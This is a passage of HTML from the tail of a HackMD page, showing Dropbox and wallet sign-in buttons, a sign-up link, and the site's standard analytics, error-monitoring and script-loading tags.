    <a href="https://hackmd.io/auth/dropbox" class="btn btn-lg btn-block btn-social btn-dropbox">
        <i class="fa fa-dropbox"></i> Sign in via Dropbox
    </a>
    
    
    
      <a href="#" class="btn btn-block btn-social btn-web3 bg-gray-800 hocus:bg-[#2b2b2b] text-white hocus:text-white">
          <img src="https://hackmd.io/images/wallet.svg" style="max-height: 20px; margin-top: 8px; margin-left: 6px; border: none;">
          <span class="sign-in-wallet-text">
              Sign in with Wallet
          </span>

          <div class="inline-flex items-center justify-between w-full hidden web3-wallet-info">
              <span>
                   Wallet
                   (
                    <span class="web3-wallet-address"></span>
                   )
              </span>

              <i class="fa fa-arrow-right" aria-hidden="true"></i>
          </div>
      </a>

      <small class="web3-wallet-info hidden text-left hocus:text-white underline hocus:underline block pt-2 ui-disconnect-connected-wallets text-gray-600 cursor-pointer">
          Connect another wallet
      </small>
    
</div>




    <div >
        <p>New to HackMD? <a href="https://hackmd.io/join" class="plausible-event-name=LoginModalSignUp">Sign up</a></p>
    </div>




        </div>
    </div>
</div>

    
    <script src="https://www.googletagmanager.com/gtag/js?id=G-NGVZMM6DR6"></script>
    <script nonce="2de7b3a1-5804-442f-8960-326f4e0584ca">
        window.dataLayer = window.dataLayer || [];
        function gtag(){dataLayer.push(arguments);}
        gtag('js', new Date());
        let userid = (document.cookie.match('(^|; )userid=([^;]*)')||0)[2];
        gtag('config', 'G-NGVZMM6DR6', {'user_id': userid});
        
    </script>


    
<script src="https://browser.sentry-cdn.com/5.15.5/bundle.min.js" crossorigin="anonymous"></script>
<script nonce="2de7b3a1-5804-442f-8960-326f4e0584ca">Sentry.init({ dsn: 'https://73410f1915d84abc8b2dd1f1aabd1c82@sentry.hackmd.dev/4', environment: 'production', integrations: function (intrus) { return intrus.filter(function (itr) { return itr.name !== 'TryCatch' }) } });</script>


    
<!-- Google Tag Manager (noscript) -->
<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-KLW9Z3"
height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
<!-- End Google Tag Manager (noscript) -->



    <script src="https://hackmd.io/api/i18n.js"></script>
     <script src="https://assets.hackmd.io/build/font-vendor.eaa8dd82d4e056021b8c.js" defer="defer"></script><script src="https://assets.hackmd.io/build/common-vendor.04da453a2a68f624f4d4.js" defer="defer"></script><script src="https://assets.hackmd.io/build/pretty-vendor.94ca39727118897623cd.js" defer="defer"></script><script src="https://assets.hackmd.io/build/pretty-common.e537850a918313f6b528.js" defer="defer"></script><script src="https://assets.hackmd.io/build/pretty.f1f41dd6786be406af0b.js" defer="defer"></script>

    

</body>
</html>
